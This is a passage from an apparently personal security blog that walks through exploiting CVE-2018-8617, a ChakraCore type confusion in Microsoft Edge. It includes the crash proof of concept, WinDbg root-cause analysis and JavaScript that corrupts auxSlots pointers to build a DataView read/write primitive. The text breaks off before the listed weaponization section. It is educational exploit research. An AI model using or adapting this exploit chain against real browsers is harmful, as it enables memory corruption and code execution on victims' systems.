          href="https://github.com/wetw0rk"
          target="_blank"
          aria-label="Github"
          rel="me noopener noreferrer"
          ><span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
</span></span></a
        >
      
    
      
        <a
          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
          href="https://www.linkedin.com/in/milton-wetw0rk/"
          target="_blank"
          aria-label="Linkedin"
          rel="me noopener noreferrer"
          ><span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
</span></span></a
        >
      
    
      
        <a
          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
          href="https://x.com/wetw0rk7"
          target="_blank"
          aria-label="X-Twitter"
          rel="me noopener noreferrer"
          ><span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg></span></span></a
        >
      
    
  </div>

</div>
  </div>
</div>

  

  

  
    <div class="mb-5"></div>
  

      
    </header>

    
    <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
      
      
      
      
      


      <div class="min-w-0 min-h-0 max-w-fit">
        

        <div class="article-content max-w-prose mb-20">
          <p>The following writeup is my approach to the weaponization of CVE-2018-8617 against Microsoft Edge 🤢. I want to start by giving a shoutout to <a
  href="https://ret2.io/"
    target="_blank"
  >RET2 Systems</a> and <a
  href="https://www.offsec.com/"
    target="_blank"
  >Offsec</a>.</p>
<p>The technique I was able to develop in order to create a read/write primitive was directly influenced by methodology I learned from <a
  href="https://ret2.io/trainings"
    target="_blank"
  >The Fundamentals of Browser Exploitation</a> a course offered by RET2 Systems. I cannot recommend  this course enough if your goal is to find 0days in browsers and don&rsquo;t know where to get started. Unfortunately, I was unable to complete it due to timing, but I see the value in the knowledge it provides and plan to retake it as soon as time presents itself.</p>
<p>Knowing how to leverage the primitives in a Windows environment I credit to Offsec as I used techniques from the <a
  href="https://www.offsec.com/courses/exp-401/"
    target="_blank"
  >Advanced Windows Exploitation (AWE)</a> course. This is a solid example why I recommend taking this course when updated as finding these &ldquo;methods&rdquo; I will admit would take me a considerable amount of time if not presented to me in the manner that it was by Offsec.</p>
<p>With the glazing out of the way let&rsquo;s jump right in.</p>

<h1 class="relative group">Table of Contents 
    <div id="table-of-contents" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#table-of-contents" aria-label="Anchor">#</a>
    </span>        
    
</h1>
<ul>
<li><a
  href="#cve-2018-8617">CVE-2018-8617</a>
<ul>
<li><a
  href="#understanding-the-vulnerability">Understanding the vulnerability</a></li>
<li><a
  href="#leveraging-auxslots">Leveraging auxSlots</a>
<ul>
<li><a
  href="#replacing-the-auxslots-pointer">Replacing the auxSlots pointer</a></li>
<li><a
  href="#choosing-the-object">Choosing the object</a></li>
<li><a
  href="#creating-dataview-object-custom-exploit-primitive">Creating DataView object (custom exploit primitive)</a></li>
</ul>
</li>
<li><a
  href="#leveraging-the-custom-dataview-object">Leveraging the custom DataView object</a></li>
<li><a
  href="#creating-the-readwrite-primitives">Creating the read/write primitives</a></li>
</ul>
</li>
<li><a
  href="#weaponization">Weaponization</a></li>
</ul>

<h1 class="relative group">CVE-2018-8617 
    <div id="cve-2018-8617" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#cve-2018-8617" aria-label="Anchor">#</a>
    </span>        
    
</h1>
<p>Below is the Proof of Concept (PoC) we will be working with:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">opt</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">,</span> <span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">a</span><span class="p">.</span><span class="nx">b</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">b</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">a</span><span class="p">.</span><span class="nx">a</span> <span class="o">=</span> <span class="nx">value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">push</span> <span class="o">=</span> <span class="nb">Array</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">push</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">1000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">a</span> <span class="o">=</span> <span class="p">{</span><span class="nx">a</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">b</span><span class="o">:</span> <span class="mi">2</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">        <span class="nx">opt</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="p">{});</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">o</span> <span class="o">=</span> <span class="p">{</span><span class="nx">a</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">b</span><span class="o">:</span> <span class="mi">2</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="nx">opt</span><span class="p">(</span><span class="nx">o</span><span class="p">,</span> <span class="nx">o</span><span class="p">,</span> <span class="mh">0x4141</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nx">print</span><span class="p">(</span><span class="nx">o</span><span class="p">.</span><span class="nx">a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">readline</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nx">main</span><span class="p">();</span>
</span></span></code></pre></div>
<h1 class="relative group">Understanding the vulnerability 
    <div id="understanding-the-vulnerability" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#understanding-the-vulnerability" aria-label="Anchor">#</a>
    </span>        
    
</h1>
<p>Before getting into any exploit development, we need to perform a root cause analysis. To do this I would be using <code>ChakraCore (ch.exe)</code> and WinDbg&rsquo;s time travel debugging functionality.</p>
<p>After running it against our PoC, we can observe the following crash:</p>
<pre tabindex="0"><code>(1db4.13f4): Access violation - code c0000005 (first/second chance not available)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
Time Travel Position: 1533:0
chakracore!Js::PathTypeHandlerBase::GetProperty+0xd5:
00007ffa`29d67195 4c8b1cc8        mov     r11,qword ptr [rax+rcx*8] ds:00010000`00004141=????????????????
</code></pre><p>The function where this occured is clearly <code>GetProperty</code>. If we unassemble backwards we can see that RAX came from offset 0x10 of R10.</p>
<pre tabindex="0"><code>0:003&gt; ub
chakracore!Js::PathTypeHandlerBase::GetProperty+0xb7:
00007ffa`29d67177 4c8b5828        mov     r11,qword ptr [rax+28h]
00007ffa`29d6717b 410fb74b12      movzx   ecx,word ptr [r11+12h]
00007ffa`29d67180 443bc9          cmp     r9d,ecx
00007ffa`29d67183 0f8211010000    jb      chakracore!Js::PathTypeHandlerBase::GetProperty+0x1da (00007ffa`29d6729a)
00007ffa`29d67189 418bc1          mov     eax,r9d
00007ffa`29d6718c 2bc1            sub     eax,ecx
00007ffa`29d6718e 4863c8          movsxd  rcx,eax
00007ffa`29d67191 498b4210        mov     rax,qword ptr [r10+10h] &lt;------ HERE
</code></pre><p>Dumping R10 we can see that this is a JSObject.</p>
<pre tabindex="0"><code>0:003&gt; dq R10 L6
0000021d`f9a8fd00  00007ffa`2a050850 0000021d`f9a8ec40
0000021d`f9a8fd10  00010000`00004141 0000021d`f9a8ebc0
0000021d`f9a8fd20  00010000`00000001 00010000`00000002
0:003&gt; dqs R10 L1
0000021d`f9a8fd00  00007ffa`2a050850 chakracore!Js::DynamicObject::`vftable&#39; &lt;-- HERE
</code></pre><p>If we return to the source code of the PoC we can assume that this crash likely occurred when we called <code>print()</code> due to the naming convention we normally see with getter functions (<code>GetProperty</code>).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl">    <span class="nx">opt</span><span class="p">(</span><span class="nx">o</span><span class="p">,</span> <span class="nx">o</span><span class="p">,</span> <span class="mh">0x4141</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">print</span><span class="p">(</span><span class="nx">o</span><span class="p">.</span><span class="nx">a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Let&rsquo;s set a hardware breakpoint to see when 0x4141 is written to the JSObject. Then go back in time to when the write occurred.</p>
<pre tabindex="0"><code>0:003&gt; ba w8 0000021d`f9a8fd10
0:003&gt; g-
Breakpoint 0 hit
Time Travel Position: 1530:F36
00000215`f7960134 48b820609df91d020000 mov rax,21DF99D6020h
</code></pre><p>Since the hardware breakpoint is on write access, execution is stopped just after the location has been written to. Let&rsquo;s go back to that instruction.</p>
<pre tabindex="0"><code>0:003&gt; p-
Time Travel Position: 1530:F35
00000215`f7960130 4d896610        mov     qword ptr [r14+10h],r12 ds:0000021d`f9a8fd10=0000021df9a8fd20
</code></pre><p>If we dump the address of the object, we can see that we are in fact writing the value to the object at offset 0x10. In addition, we see the use of an auxSlots pointer since the original value here pointed to 1 and 2 (<code>{a: 1, b: 2}</code>) of the PoC.</p>
<pre tabindex="0"><code>0:003&gt; dq 0000021d`f9a8fd00 L6
0000021d`f9a8fd00  00007ffa`2a050850 0000021d`f9a8ec40
0000021d`f9a8fd10  0000021d`f9a8fd20 0000021d`f9a8ebc0
0000021d`f9a8fd20  00010000`00000001 00010000`00000002 &lt;---+
0:003&gt; dq 0000021d`f9a8fd20 L2                             |
0000021d`f9a8fd20  00010000`00000001 00010000`00000002 ----+
0:003&gt; r r12
r12=0001000000004141
</code></pre><p>Since the object <code>o</code> is originally created with inline values (due to its declaration), a type change must have happened for it to be using an auxSlots pointer.</p>
<p>If we go back in time once more, we trigger the breakpoint again and see where the type change occurred.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="mi">0</span><span class="o">:</span><span class="mi">003</span><span class="o">&gt;</span> <span class="nx">g</span><span class="o">-</span>
</span></span><span class="line"><span class="cl"><span class="nx">Breakpoint</span> <span class="mi">0</span> <span class="nx">hit</span>
</span></span><span class="line"><span class="cl"><span class="nx">Time</span> <span class="nx">Travel</span> <span class="nx">Position</span><span class="o">:</span> <span class="mi">1530</span><span class="o">:</span><span class="mi">7</span><span class="nx">FD</span>
</span></span><span class="line"><span class="cl"><span class="nx">chakracore</span><span class="o">!</span><span class="nx">Js</span><span class="o">::</span><span class="nx">DynamicTypeHandler</span><span class="o">::</span><span class="nx">AdjustSlots</span><span class="o">+</span><span class="mh">0x8c</span><span class="o">:</span>
</span></span><span class="line"><span class="cl"><span class="mi">00007</span><span class="nx">ffa</span><span class="sb">`29d9bfe4 488b5c2430      mov     rbx,qword ptr [rsp+30h] ss:0000002e`</span><span class="nx">e77fe3d0</span><span class="o">=</span><span class="mi">0000021</span><span class="nx">df9a8ebc0</span>
</span></span><span class="line"><span class="cl"><span class="mi">0</span><span class="o">:</span><span class="mi">003</span><span class="o">&gt;</span> <span class="nx">p</span><span class="o">-</span>
</span></span><span class="line"><span class="cl"><span class="nx">Time</span> <span class="nx">Travel</span> <span class="nx">Position</span><span class="o">:</span> <span class="mi">1530</span><span class="o">:</span><span class="mi">7</span><span class="nx">FC</span>
</span></span><span class="line"><span class="cl"><span class="nx">chakracore</span><span class="o">!</span><span class="nx">Js</span><span class="o">::</span><span class="nx">DynamicTypeHandler</span><span class="o">::</span><span class="nx">AdjustSlots</span><span class="o">+</span><span class="mh">0x88</span><span class="o">:</span>
</span></span><span class="line"><span class="cl"><span class="mi">00007</span><span class="nx">ffa</span><span class="sb">`29d9bfe0 4c894b10        mov     qword ptr [rbx+10h],r9 ds:0000021d`</span><span class="nx">f9a8fd10</span><span class="o">=</span><span class="mi">0001000000000001</span>
</span></span><span class="line"><span class="cl">    <span class="mi">0</span><span class="o">:</span><span class="mi">003</span><span class="o">&gt;</span> <span class="nx">dq</span> <span class="nx">rbx</span> <span class="nx">L6</span>
</span></span><span class="line"><span class="cl">    <span class="mi">0000021</span><span class="nx">d</span><span class="sb">`f9a8fd00  00007ffa`</span><span class="mi">2</span><span class="nx">a050850</span> <span class="mi">0000021</span><span class="nx">d</span><span class="sb">`f9a2ed40 &lt;---- Object
</span></span></span><span class="line"><span class="cl"><span class="sb"> +-&gt;0000021d`</span><span class="nx">f9a8fd10</span>  <span class="mi">00010000</span><span class="sb">`00000001 00000000`</span><span class="mi">00000000</span>
</span></span><span class="line"><span class="cl"> <span class="o">|</span>  <span class="mi">0000021</span><span class="nx">d</span><span class="sb">`f9a8fd20  00010000`</span><span class="mi">00000001</span> <span class="mi">00010000</span><span class="sb">`00000002 &lt;---- Old inline values
</span></span></span><span class="line"><span class="cl"><span class="sb"> |
</span></span></span><span class="line"><span class="cl"><span class="sb"> +------------------- to be written here ------------------+
</span></span></span><span class="line"><span class="cl"><span class="sb">                                                           |
</span></span></span><span class="line"><span class="cl"><span class="sb">0:003&gt; r r9                                                |
</span></span></span><span class="line"><span class="cl"><span class="sb">r9=0000021df9a8fd20 &lt;--- auxSlots ------------&gt; -----------+
</span></span></span></code></pre></div><p>Based on the analysis we can conclude this is a Type Confusion Vulnerability&hellip;</p>

<h1 class="relative group">Leveraging auxSlots 
    <div id="leveraging-auxslots" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#leveraging-auxslots" aria-label="Anchor">#</a>
    </span>        
    
</h1>
<p>To reach our goal of controlling the instruction pointer we need to perform the following:</p>
<ul>
<li>Confirm what we control and see how to leverage it (in this case we control the auxSlots pointer)</li>
<li>Replace the auxSlots pointer with an object giving us more control.</li>
</ul>

<h2 class="relative group">Replacing the auxSlots pointer 
    <div id="replacing-the-auxslots-pointer" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#replacing-the-auxslots-pointer" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>Before abusing auxSlots, we need to know what object we&rsquo;re going to replace with it. Let&rsquo;s try using an object instead of a random value, in my case an <code>ArrayBuffer()</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">arr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mh">0x100</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">o</span> <span class="o">=</span> <span class="p">{</span><span class="nx">a</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">b</span><span class="o">:</span> <span class="mi">2</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="nx">opt</span><span class="p">(</span><span class="nx">o</span><span class="p">,</span> <span class="nx">o</span><span class="p">,</span> <span class="nx">arr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">print</span><span class="p">(</span><span class="nx">o</span><span class="p">.</span><span class="nx">a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Once sent we hit the breakpoint, and we confirm that we have replaced the auxSlots pointer with a pointer to the <code>ArrayBuffer()</code> object.</p>
<pre tabindex="0"><code>0:003&gt; g-
(190c.a04): Access violation - code c0000005 (first/second chance not available)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
Time Travel Position: 161C:0
chakracore!ContextAPIWrapper_Core&lt;0,&lt;lambda_e971aa2595632ccc9804a91330c40ab9&gt; &gt;+0xbe6a5:
00007ffa`30c1f679 48399840040000  cmp     qword ptr [rax+440h],rbx ds:41894808`41895100=????????????????
0:003&gt; p-
0:003&gt; p-
0:003&gt; p-
Time Travel Position: 161B:4F4
chakracore!ContextAPIWrapper_Core&lt;0,&lt;lambda_e971aa2595632ccc9804a91330c40ab9&gt; &gt;+0xbe69d:
00007ffa`30c1f671 488b4808        mov     rcx,qword ptr [rax+8] ds:00007ffa`30e15c28={chakracore!DListBase&lt;Memory::ArenaData * __ptr64,FakeCount&gt;::~DListBase&lt;Memory::ArenaData * __ptr64,FakeCount&gt; (00007ffa`30a06130)}
0:003&gt; dqs rax L1
00007ffa`30e15c20  00007ffa`30b3c0e4 chakracore!Js::JavascriptArrayBuffer::Finalize
</code></pre>
<h2 class="relative group">Choosing the object 
    <div id="choosing-the-object" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#choosing-the-object" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>Now that we know we can corrupt the auxSlots pointer we need to find an object that will turn this into a read/write primitive.</p>
<p>The approach we&rsquo;ll take will involve multiple objects.</p>
<ul>
<li><code>obj</code>: Will be used to overwrite the <code>o</code> object&rsquo;s auxSlots pointer via the type confusion</li>
<li><code>dv1</code>: A DataView object pointed to by <code>obj</code> will serve as an interface to the actual ArrayBuffer</li>
</ul>
<p>With this setup we can do the following:</p>
<ul>
<li><code>o's</code> auxSlots pointer via the type confusion will point to <code>obj</code>, meaning <code>o</code> can directly modify the in memory contents of <code>obj</code></li>
<li>Using <code>o.c</code> we&rsquo;ll be able to modify the auxSlots pointer of <code>obj</code> to point to <code>dv1</code> the DataView object</li>
<li>Now <code>obj</code> will be able to modify the memory of the <code>dv1</code> object meaning <code>obj.h</code> can then be used to set the buffer pointer of <code>dv1</code></li>
</ul>
<p>In theory this will allow us to be able to write and read wherever the buffer pointer of <code>dv1</code> is set.</p>
<p>Below is the code to do just that:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">obj</span> <span class="o">=</span> <span class="p">{};</span>  <span class="c1">// &#39;o&#39; objects auxSlots pointer will be pointing here via type confusion
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">obj</span><span class="p">.</span><span class="nx">a</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">obj</span><span class="p">.</span><span class="nx">b</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">obj</span><span class="p">.</span><span class="nx">c</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">obj</span><span class="p">.</span><span class="nx">d</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">obj</span><span class="p">.</span><span class="nx">e</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">obj</span><span class="p">.</span><span class="nx">f</span> <span class="o">=</span> <span class="mi">6</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">obj</span><span class="p">.</span><span class="nx">g</span> <span class="o">=</span> <span class="mi">7</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">obj</span><span class="p">.</span><span class="nx">h</span> <span class="o">=</span> <span class="mi">8</span>
</span></span><span class="line"><span class="cl"><span class="nx">obj</span><span class="p">.</span><span class="nx">i</span> <span class="o">=</span> <span class="mi">9</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">obj</span><span class="p">.</span><span class="nx">j</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">dv1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DataView</span><span class="p">(</span><span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mh">0x100</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">opt</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">,</span> <span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">a</span><span class="p">.</span><span class="nx">b</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">b</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">a</span><span class="p">.</span><span class="nx">a</span> <span class="o">=</span> <span class="nx">value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">push</span> <span class="o">=</span> <span class="nb">Array</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">push</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">1000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">a</span> <span class="o">=</span> <span class="p">{</span><span class="nx">a</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">b</span><span class="o">:</span> <span class="mi">2</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">        <span class="nx">opt</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="p">{});</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">o</span> <span class="o">=</span> <span class="p">{</span><span class="nx">a</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">b</span><span class="o">:</span> <span class="mi">2</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">Math</span><span class="p">.</span><span class="nx">sin</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Trigger Type Confusion, writing a pointer to obj in
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// o&#39;s auxSlots pointer.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">opt</span><span class="p">(</span><span class="nx">o</span><span class="p">,</span> <span class="nx">o</span><span class="p">,</span> <span class="nx">obj</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Set the auxSlots pointer of &#34;obj&#34; object to dv1
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">o</span><span class="p">.</span><span class="nx">c</span> <span class="o">=</span> <span class="nx">dv1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">Math</span><span class="p">.</span><span class="nx">sin</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">print</span><span class="p">(</span><span class="s2">&#34;[*] Attach WinDbg now..&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">readline</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nx">readline</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nx">main</span><span class="p">();</span>
</span></span></code></pre></div><p>Let&rsquo;s go ahead and launch this.</p>
<pre tabindex="0"><code>C:\tools\core&gt;ch.exe \\192.168.81.144\share\edge\4.15.3\4.15.3.2_extra_mile\CVE-2018-8617.js
[*] Attach WinDbg now..
</code></pre><p>Then confirm that we have obtained the level of control we expect (<code>bu ChakraCore!Js::Math::sin</code>).</p>
<pre tabindex="0"><code>0:006&gt; bu chakracore!Js::Math::Sin
0:006&gt; g
ModLoad: 00007ffa`70060000 00007ffa`7006c000   C:\Windows\SYSTEM32\CRYPTBASE.DLL
Breakpoint 0 hit
chakracore!Js::Math::Sin:
